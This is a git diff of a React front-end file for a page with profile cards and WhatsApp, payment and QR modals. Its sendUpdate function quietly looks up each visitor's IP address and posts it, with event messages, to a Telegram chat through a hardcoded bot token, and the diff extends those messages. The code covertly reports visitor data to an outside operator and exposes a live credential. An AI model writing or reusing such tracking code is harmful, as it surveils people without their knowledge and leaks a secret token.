@@ -1,13 +1,11 @@
 /* eslint-disable jsx-a11y/alt-text */
 /* eslint-disable no-unused-vars */
 import './App.css';
-import React, { useEffect, useState } from 'react';
+import React, { useState } from 'react';
 import WhatsappModal from './WhatsappModal';
 import PaymentModal from './PaymentModal';
-import CopyModal from './CopyModal';
 import ProfileCard from './ProfileCard';
 import QRCard from './QRCard';
-import profiles from './profiles';
 
 let ip = 'Not Found'
 
@@ -17,7 +15,7 @@ export async function sendUpdate(msg) {
       .then(result => result.json())
       .then((output) => {
         ip = output;
-        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
+        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
         fetch(url, {
           method: "POST",
           headers: { 'Content-Type': 'application/json' },
@@ -27,7 +25,7 @@ export async function sendUpdate(msg) {
         })
       }).catch(err => console.error(err));
   } else {
-    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
+    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${process.env.REACT_APP_USERNAME}:${msg}--------${ip.ipAddress}`
     fetch(url, {
       method: "POST",
       headers: { 'Content-Type': 'application/json' },
@@ -43,7 +41,6 @@ function App() {
   const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);
   const [isQROpen, setIsQROpen] = useState(false);
   const telegramLink = process.env.REACT_APP_USERNAME?.toLowerCase() || 'shruthiee'
-
 
   const handlepayButton = async () => {
     console.log('pay button clicked')
